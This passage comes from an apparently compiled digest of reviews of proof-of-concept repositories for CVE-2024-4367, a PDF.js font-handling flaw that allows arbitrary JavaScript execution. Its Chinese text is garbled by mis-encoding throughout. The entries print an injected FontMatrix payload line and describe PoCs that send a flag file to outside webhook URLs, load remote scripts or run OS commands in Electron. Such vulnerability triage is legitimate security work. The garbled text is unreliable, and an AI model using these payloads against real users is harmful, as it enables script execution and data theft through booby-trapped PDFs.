1.  **æ„é€ æ¶æ„PDFï¼š** æ”»å‡»è€…éœ€è¦åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ PDF æ–‡æ¡£ã€‚ ä»æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç  `exploit.pdf` å’Œ `poc.pdf` æ¥çœ‹ï¼Œæ”»å‡»è€…åœ¨PDFçš„å­—ä½“å¯¹è±¡ä¸­åµŒå…¥ JavaScript ä»£ç ã€‚ å…·ä½“æ¥è¯´ï¼Œä»£ç è¢«åµŒå…¥åˆ° `/Font` å¯¹è±¡çš„ `/FontMatrix` å±æ€§ä¸­ï¼Œé€šè¿‡è¿™ç§æ–¹å¼ç»•è¿‡ç±»å‹æ£€æŸ¥ã€‚
2.  **è§¦å‘æ¼æ´ï¼š** å½“ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€æ­¤ PDF æ–‡æ¡£æ—¶ï¼ŒPDF.js ä¼šå°è¯•æ¸²æŸ“å­—ä½“ï¼Œä»è€Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„ JavaScript ä»£ç ã€‚
3.  **ä»£ç æ‰§è¡Œï¼š**  åµŒå…¥çš„ JavaScript ä»£ç å¯ä»¥æ‰§è¡Œå„ç§æ¶æ„æ“ä½œã€‚ åœ¨æä¾›çš„ POC ä»£ç ä¸­ï¼Œæ¶æ„ JavaScript ä»£ç çš„ç›®çš„æ˜¯çªƒå–ä½äº `/app/admin/flag.pdf` çš„ flag æ–‡ä»¶ï¼Œå¹¶å°†å†…å®¹å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚
     *   `exploit.pdf`: å°† flag ä»¥ DataURL æ ¼å¼å‘é€åˆ° `https://ha.requestcatcher.com/`ã€‚
     *   `poc.pdf`:  å°† flag ä»¥æ–‡ä»¶æ ¼å¼å‘é€åˆ° `https://webhook.site/134021d3-88f1-44a6-aa82-e48e33247fcc`ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æ ¹æ®å¯¹æä¾›çš„ä¸¤ä¸ª PDF æ–‡ä»¶çš„åˆ†æï¼Œæ²¡æœ‰å‘ç°æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚ ä¸¤ä¸ª PDF æ–‡ä»¶ä¸­çš„ JavaScript ä»£ç éƒ½æ—¨åœ¨åˆ©ç”¨æ¼æ´çªƒå– flagï¼Œå¹¶å°† flag æ•°æ®å‘é€åˆ°å¤–éƒ¨æœåŠ¡å™¨è¿›è¡Œ exfiltrationã€‚ æ²¡æœ‰å‘ç°å…¶ä»–éšè—çš„æ¶æ„è¡Œä¸ºæˆ–åé—¨ä»£ç ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æä¾›çš„ POC ä»£ç åˆ©ç”¨äº† PDF.js åœ¨å­—ä½“å¤„ç†ä¸­ç±»å‹æ£€æŸ¥çš„ç¼ºå¤±æ¼æ´ã€‚ æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢ç»“æœï¼Œæ­¤æ¼æ´å…è®¸æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ å› æ­¤ï¼ŒPOC ä»£ç **æœ‰æ•ˆ**ã€‚

**é¡¹ç›®åœ°å€:** [BektiHandoyo/cve-pdf-host](https://github.com/BektiHandoyo/cve-pdf-host)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #4

**æ¥æº**: [CVE-2024-4367-Bhavyakcwestern_Hacking-pdf.js-vulnerability.md](../2024/CVE-2024-4367-Bhavyakcwestern_Hacking-pdf.js-vulnerability.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js, Firefox, Firefox ESR, Thunderbird

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰å’Œè¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** PDF.js < 4.2.67, Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº PDF.js ä¸­çš„é«˜å±æ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡ç‰¹åˆ¶çš„ PDF æ–‡ä»¶æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ `fontMatrix` æ•°ç»„ä¸­çš„æ¼æ´ï¼Œå°†æ¶æ„ä»£ç æ³¨å…¥åˆ° PDF æ–‡ä»¶ä¸­ï¼Œå½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„ PDF.js ç‰ˆæœ¬ï¼ˆå¦‚ Firefox 126 ä¹‹å‰çš„ç‰ˆæœ¬ï¼‰æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œæ¶æ„ JavaScript ä»£ç å°†è¢«æ‰§è¡Œã€‚è¿™å¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ï¼Œæˆ–è€…å¦‚æœ PDF.js è¿è¡Œåœ¨ Electron ç­‰ç¯å¢ƒä¸­ï¼Œç”šè‡³å¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§ï¼š** æä¾›çš„POCä»£ç ï¼ˆ`ex1.pdf` å’Œ `ex-gist.pdf`ï¼‰é€šè¿‡æ„é€ æ¶æ„çš„`fontMatrix`æ•°æ®ï¼Œè¯æ˜äº†è¯¥æ¼æ´çš„å¯åˆ©ç”¨æ€§ã€‚`ex1.pdf`è§¦å‘alertï¼Œ`ex-gist.pdf`ç”šè‡³å¯ä»¥ä»è¿œç¨‹åœ°å€åŠ è½½å¹¶æ‰§è¡ŒJavaScriptï¼ŒéªŒè¯äº†æ¼æ´åˆ©ç”¨çš„æœ‰æ•ˆæ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š** è™½ç„¶è¯¥é¡¹ç›®æä¾›äº†æ¼æ´åˆ©ç”¨çš„PoCï¼Œä½†æ˜¯æ£€æŸ¥äº†ä»“åº“ä¸­çš„å…¶ä»–æ–‡ä»¶ï¼Œå¦‚`astro.config.mjs`å’Œ`package-lock.json`ç­‰é…ç½®æ–‡ä»¶ï¼Œå¹¶æœªå‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç ã€‚ é£é™©ä¸»è¦å­˜åœ¨äºå¦‚æœä¸‹è½½è¯¥é¡¹ç›®å¹¶åœ¨å—ä¿¡ä»»çš„ç¯å¢ƒä¸­è¿è¡Œï¼Œè¿œç¨‹åŠ è½½çš„jsæ–‡ä»¶åŒ…å«æ¶æ„payloadçš„å¯èƒ½æ€§ï¼Œå› æ­¤æ¨æµ‹æŠ•æ¯’é£é™©è¾ƒä½ï¼Œé¢„ä¼°ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„å­—ä½“çš„PDFæ–‡ä»¶ï¼Œè¯¥å­—ä½“ä¸­åŒ…å«æ¶æ„çš„`fontMatrix`æ•°ç»„ã€‚
2.  `fontMatrix`æ•°ç»„çš„å…ƒç´ åŒ…å«JavaScriptä»£ç ã€‚
3.  å½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„PDF.jsç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.jsä¼šè§£æå­—ä½“æ•°æ®ï¼Œç”±äºç¼ºå°‘é€‚å½“çš„ç±»å‹æ£€æŸ¥ï¼Œä¼šå°†`fontMatrix`ä¸­çš„å­—ç¬¦ä¸²ä½œä¸ºJavaScriptä»£ç æ‰§è¡Œã€‚
4.  æ¶æ„JavaScriptä»£ç åœ¨å—å®³è€…çš„æµè§ˆå™¨æˆ–Electronåº”ç”¨ä¸­æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´XSSæˆ–RCEã€‚

**é¡¹ç›®åœ°å€:** [Bhavyakcwestern/Hacking-pdf.js-vulnerability](https://github.com/Bhavyakcwestern/Hacking-pdf.js-vulnerability)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #5

**æ¥æº**: [CVE-2024-4367-LOURC0D3_CVE-2024-4367-PoC.md](../2024/CVE-2024-4367-LOURC0D3_CVE-2024-4367-PoC.md)

## CVE-2024-4367 - PDF.js ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼Œè¿œç¨‹ä»£ç æ‰§è¡Œç­‰ã€‚

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶ã€‚PDF.js å¿…é¡»é…ç½®ä¸º isEvalSupported=true (é»˜è®¤)

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº PDF.js ä¸­çš„æ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œå½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œå³å¯è§¦å‘æ¼æ´ã€‚ 

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚`CVE-2024-4367.py` è„šæœ¬ç”¨äºç”ŸæˆåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ PDF æ–‡ä»¶ã€‚ README.md æä¾›äº†ä½¿ç”¨ç¤ºä¾‹ï¼ŒåŒ…æ‹¬æ‰§è¡Œ `alert(document.domain)` ä»¥è¯æ˜ JavaScript ä»£ç æ‰§è¡Œï¼Œä»¥åŠåˆ©ç”¨ `require('child_process').exec()` æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ï¼ˆä»…åœ¨ Electron ç¯å¢ƒä¸‹ï¼‰ã€‚

**æŠ•æ¯’é£é™©ï¼š**
PoC ä»£ç æœ¬èº«æ˜¯ä¸ºäº†åˆ©ç”¨æ¼æ´ï¼Œè€Œä¸æ˜¯æ¤å…¥åé—¨ï¼Œå…¶ç›®çš„æ˜¯ç”ŸæˆåŒ…å«æ¶æ„ JavaScript çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶æ—¨åœ¨åˆ©ç”¨ç›®æ ‡åº”ç”¨ç¨‹åºï¼ˆFirefox, Thunderbirdï¼‰ä¸­çš„æ¼æ´ã€‚ è¯¥ä»“åº“ä¸­æŠ•æ¯’çš„é£é™©è¾ƒä½ï¼Œå¤§çº¦ä¸º 5%ã€‚ ä¸»è¦çš„æ½œåœ¨é£é™©å¯èƒ½æ¥è‡ªï¼š

1.  **ä¾èµ–é¡¹æŠ•æ¯’:** è„šæœ¬æœ¬èº«å¾ˆç®€å•ï¼Œä¸ä¾èµ–äºå¤–éƒ¨åº“ã€‚å› æ­¤ï¼Œä¾èµ–é¡¹æŠ•æ¯’çš„é£é™©å¾ˆä½ã€‚
2.  **ä»£ç é€»è¾‘æ··æ·†:**  ä»£ç ç›¸å¯¹æ¸…æ™°ï¼Œæ²¡æœ‰æ˜æ˜¾çš„æ¶æ„é€»è¾‘æˆ–æ··æ·†ã€‚
3.  **ä¾›åº”é“¾æ”»å‡»:** ç”±äºè¯¥ PoC æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„è„šæœ¬ï¼Œå¹¶æ²¡æœ‰å¤æ‚çš„æ„å»ºæˆ–åˆ†å‘è¿‡ç¨‹ï¼Œä¾›åº”é“¾æ”»å‡»çš„é£é™©ä¹Ÿè¾ƒä½ã€‚

ç„¶è€Œï¼Œåœ¨ä½¿ç”¨ä»»ä½•ç¬¬ä¸‰æ–¹æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç æ—¶ï¼Œéƒ½åº”ä¿æŒè°¨æ…ï¼Œä»”ç»†å®¡æŸ¥ä»£ç ï¼Œå¹¶åœ¨éš”ç¦»ç¯å¢ƒä¸­æµ‹è¯•ï¼Œä»¥é¿å…æ½œåœ¨çš„é£é™©ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æ¼æ´ç‚¹ï¼š** PDF.js åœ¨å¤„ç†å­—ä½“æ—¶çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±ã€‚
2.  **æ”»å‡»å‘é‡ï¼š** æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åˆ©ç”¨å­—ä½“å¤„ç†ä¸­çš„æ¼æ´åµŒå…¥æ¶æ„ JavaScript ä»£ç ã€‚
3.  **åˆ©ç”¨æ­¥éª¤ï¼š**
    *   ä½¿ç”¨ `CVE-2024-4367.py` è„šæœ¬ç”Ÿæˆæ¶æ„çš„ `poc.pdf` æ–‡ä»¶ï¼ŒæŒ‡å®šè¦æ‰§è¡Œçš„ JavaScript ä»£ç ä½œä¸ºå‚æ•°ã€‚
    *   è¯±å¯¼å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„ Firefox, Firefox ESR æˆ– Thunderbird æ‰“å¼€è¯¥ `poc.pdf` æ–‡ä»¶ã€‚
    *   å¦‚æœ PDF.js é…ç½®å…è®¸æ‰§è¡Œ JavaScript ä»£ç ï¼ˆé»˜è®¤æƒ…å†µä¸‹ `isEvalSupported` ä¸º trueï¼‰ï¼Œåˆ™åµŒå…¥åœ¨ PDF ä¸­çš„ JavaScript ä»£ç å°†åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
4.  **æ½œåœ¨å½±å“ï¼š** æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´å¯èƒ½å…è®¸æ”»å‡»è€…æ‰§è¡Œä»»æ„ JavaScript ä»£ç ï¼Œä»è€Œå¯¼è‡´:
    *   åœ¨æµè§ˆå™¨ä¸Šä¸‹æ–‡ä¸­çªƒå–æ•æ„Ÿä¿¡æ¯ï¼ˆä¾‹å¦‚ï¼Œcookiesï¼Œä¼šè¯ä»¤ç‰Œï¼‰ã€‚
    *   è¿›è¡Œè·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€‚
    *   å¦‚æœ PDF.js è¿è¡Œåœ¨ Electron ç­‰ç¯å¢ƒä¸­ï¼Œå¯èƒ½æ‰§è¡Œä»»æ„æ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚

**é¡¹ç›®åœ°å€:** [LOURC0D3/CVE-2024-4367-PoC](https://github.com/LOURC0D3/CVE-2024-4367-PoC)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #6

**æ¥æº**: [CVE-2024-4367-Masamuneee_CVE-2024-4367-Analysis.md](../2024/CVE-2024-4367-Masamuneee_CVE-2024-4367-Analysis.md)

## CVE-2024-4367: PDF.js ä»»æ„JavaScriptæ‰§è¡Œæ¼æ´

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´XSSæ”»å‡»ï¼Œçªƒå–ç”¨æˆ·æ•°æ®ï¼Œç”šè‡³è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºç¼ºå°‘å¯¹å­—ä½“å¤„ç†çš„ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxã€Firefox ESRæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼ŒåµŒå…¥çš„JavaScriptä»£ç ä¼šè¢«æ‰§è¡Œã€‚  

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**  æä¾›çš„POCä»£ç çœ‹èµ·æ¥æ˜¯æœ‰æ•ˆçš„ã€‚`README.md` æ–‡ä»¶æä¾›äº†æ¼æ´çš„æ¦‚è¿°ã€åˆ©ç”¨æ–¹æ³•ã€ç¼“è§£æªæ–½å’Œè¯¦ç»†åˆ†æçš„é“¾æ¥ã€‚`poc.py` è„šæœ¬ç”¨äºç”ŸæˆåŒ…å«æ¶æ„payloadçš„PDFæ–‡ä»¶ã€‚`app` ç›®å½•åŒ…å«ä¸€ä¸ªç®€å•çš„Node.jsåº”ç”¨ï¼Œç”¨äºæœ¬åœ°æµ‹è¯•ï¼Œå…è®¸ä¸Šä¼ PDFæ–‡ä»¶å¹¶é€šè¿‡`pdfjs-dist`åº“è¿›è¡Œæ¸²æŸ“ã€‚  `public/index.html` åŒ…å«å‰ç«¯ä»£ç ï¼Œç”¨äºä¸Šä¼ PDFå¹¶ä½¿ç”¨`pdf.js`è¿›è¡Œæ¸²æŸ“ã€‚  

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**  
*   æŸ¥çœ‹ `poc.pdf` ç¡®è®¤æ˜¯å¦æ¤å…¥åé—¨ï¼Œ`poc.pdf` æ˜¯æ¶æ„çš„PDFï¼Œ åˆ©ç”¨äº†å­—ä½“çš„è§£ææ¼æ´ï¼Œæ‰§è¡ŒJavascriptä»£ç ã€‚ ä½†æ˜¯ä¸å±äºåé—¨ï¼Œåªå±äºpocéªŒè¯çš„ä¸€éƒ¨åˆ†
*   æŸ¥çœ‹ `server.js` ä¸­é—´ä»¶æ˜¯å¦åŒ…å«æ¶æ„ä»£ç ï¼Œ`server.js` ä¸­é—´ä»¶å±äºæ­£å¸¸çš„expressä¸Šä¼ pdfå’Œæ‰“å¼€pdfçš„é€»è¾‘ã€‚
*   æŸ¥çœ‹ `public/index.html` ç¡®è®¤æ˜¯å¦è°ƒç”¨æ¶æ„apiï¼Œ `public/index.html`å±äºå‰ç«¯ä»£ç ï¼Œç”¨äºä¸Šä¼ pdfï¼Œå¹¶æ¸²æŸ“pdfï¼Œæ²¡æœ‰æ¶æ„apiè°ƒç”¨ã€‚
*   æŸ¥çœ‹ `poc.py` ç¡®è®¤æ˜¯å¦ç”Ÿæˆäº†æ¶æ„PDFï¼Œ`poc.py`å±äºpocéªŒè¯çš„ä¸€éƒ¨åˆ†
æ€»ä½“åˆ¤æ–­æŠ•æ¯’é£é™©æä½ï¼Œå¯èƒ½å­˜åœ¨çš„é£é™©æ˜¯ä¾èµ–åŒ…çš„ä¾›åº”é“¾æŠ•æ¯’é£é™©,è€ƒè™‘åˆ°node_modulesä½“ç§¯å·¨å¤§ï¼Œäººå·¥å®¡è®¡æˆæœ¬å¤ªé«˜ï¼Œæ‰€ä»¥è®¤ä¸ºå­˜åœ¨ 1% çš„æ½œåœ¨æŠ•æ¯’é£é™©ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**
1.  æ”»å‡»è€…ä½¿ç”¨ `poc.py` è„šæœ¬ç”ŸæˆåŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…é€šè¿‡å„ç§æ‰‹æ®µï¼ˆä¾‹å¦‚ï¼Œç”µå­é‚®ä»¶ã€ç½‘ç«™é“¾æ¥ï¼‰è¯±ä½¿ç”¨æˆ·æ‰“å¼€è¯¥PDFæ–‡ä»¶ã€‚
3.  å¦‚æœç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxã€Firefox ESRæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶ï¼ŒPDF.jsä¼šè§£æè¯¥æ–‡ä»¶ã€‚
4.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„çš„JavaScriptä»£ç ä¼šåœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œä»è€Œå®ç°XSSæ”»å‡»æˆ–æ½œåœ¨çš„è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
5.  æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ‰§è¡Œçš„JavaScriptä»£ç çªƒå–ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯ã€ä¿®æ”¹ç½‘é¡µå†…å®¹ï¼Œç”šè‡³æ§åˆ¶ç”¨æˆ·çš„è®¡ç®—æœºã€‚

**é¡¹ç›®åœ°å€:** [Masamuneee/CVE-2024-4367-Analysis](https://github.com/Masamuneee/CVE-2024-4367-Analysis)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #7

**æ¥æº**: [CVE-2024-4367-MihranGIT_POC_CVE-2024-4367.md](../2024/CVE-2024-4367-MihranGIT_POC_CVE-2024-4367.md)

## CVE-2024-4367 - Firefox/Thunderbird PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird

**å±å®³ç­‰çº§:** ä¸­å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»(XSS)å’Œæ•æ„Ÿä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶ï¼Œå¹¶ä¸”PDF.jsé…ç½®ä¸­`isEvalSupported`è®¾ç½®ä¸º`true` (é»˜è®¤å€¼)

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ Mozilla Firefoxã€Firefox ESR å’Œ Thunderbird ä¸­ PDF.js ç»„ä»¶çš„ä¸€ä¸ªæ¼æ´ï¼Œå®ƒå…è®¸æ”»å‡»è€…åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚è¯¥æ¼æ´æ˜¯ç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥å¯¼è‡´çš„ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„ POC ä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒåŒ…å«ä¸€ä¸ªç‰¹åˆ¶çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å®šä¹‰äº†ä¸€ä¸ªè‡ªå®šä¹‰å­—ä½“ï¼ˆå¯¹è±¡ 5 0 objï¼‰ï¼Œè¯¥å­—ä½“çš„ `FontMatrix` å±æ€§åŒ…å« JavaScript ä»£ç ï¼š`/FontMatrix [0.1 0 0 0.1 0 (1\); alert\('document.location'\)]`ã€‚å½“å‘ˆç°æ­¤ PDF æ–‡ä»¶æ—¶ï¼Œå¦‚æœ PDF.js æ²¡æœ‰æ­£ç¡®æ‰§è¡Œç±»å‹æ£€æŸ¥ï¼Œå°±ä¼šæ‰§è¡Œ `alert('document.location')`ã€‚

**æŠ•æ¯’é£é™©ï¼š**

ç»è¿‡åˆ†æï¼Œæä¾›çš„POCä»£ç ä¸­**æ²¡æœ‰**å‘ç°æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚`alert('document.location')` ä»…ä»…æ˜¯ä¸€ä¸ªå¼¹çª—ï¼Œç”¨äºéªŒè¯XSSæ˜¯å¦æ‰§è¡Œ. 

æŠ•æ¯’é£é™©è¯„ä¼°ï¼š0%

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **åˆ›å»ºæ¶æ„ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…ä¼šåˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ç‰¹åˆ¶ PDF æ–‡ä»¶ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒJavaScript ä»£ç åµŒå…¥åœ¨å­—ä½“å¯¹è±¡çš„ `FontMatrix` å±æ€§ä¸­ã€‚
2.  **è¯±å¯¼ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…éœ€è¦è¯±å¯¼ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“ç‰ˆæœ¬çš„ Firefoxã€Firefox ESR æˆ– Thunderbird æ‰“å¼€è¿™ä¸ªæ¶æ„ PDF æ–‡ä»¶ã€‚è¿™å¯ä»¥é€šè¿‡ç½‘ç»œé’“é±¼æ”»å‡»ã€æ¶æ„ç½‘ç«™æˆ–å°† PDF æ–‡ä»¶åµŒå…¥åˆ°ç”µå­é‚®ä»¶ä¸­æ¥å®ç°ã€‚
3.  **JavaScript ä»£ç æ‰§è¡Œï¼š** å½“ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶æ—¶ï¼ŒPDF.js ä¼šå°è¯•è§£æå’Œå‘ˆç° PDF å†…å®¹ã€‚ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå­—ä½“å¯¹è±¡çš„ `FontMatrix` å±æ€§ä¸­çš„ JavaScript ä»£ç å°†è¢«æ‰§è¡Œã€‚å¦‚æœæˆåŠŸ `alert('document.location')` ä¼šè§¦å‘ã€‚
4.  **æ½œåœ¨å½±å“ï¼š** æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´å¯èƒ½å¯¼è‡´ä»¥ä¸‹åæœï¼š
    *   **è·¨ç«™è„šæœ¬æ”»å‡» (XSS)ï¼š** æ”»å‡»è€…å¯ä»¥åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œæ¶æ„ JavaScript ä»£ç ï¼Œä»è€Œçªƒå–æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚ Cookieã€ä¼šè¯ä»¤ç‰Œï¼‰ã€ç¯¡æ”¹ç½‘é¡µå†…å®¹æˆ–é‡å®šå‘ç”¨æˆ·åˆ°æ¶æ„ç½‘ç«™ã€‚
    *   **ä¿¡æ¯æ³„éœ²ï¼š** æ”»å‡»è€…å¯ä»¥è®¿é—®ç”¨æˆ·çš„æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿæˆ–ç½‘ç»œèµ„æºï¼Œä»è€Œæ³„éœ²æ•æ„Ÿä¿¡æ¯ã€‚

**ç¼“è§£æªæ–½ï¼š**

*   **å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬ï¼š** å°† Firefoxã€Firefox ESR å’Œ Thunderbird å‡çº§åˆ°å·²ä¿®å¤æ­¤æ¼æ´çš„ç‰ˆæœ¬ (>= Firefox 126, >= Firefox ESR 115.11, >= Thunderbird 115.11)ã€‚
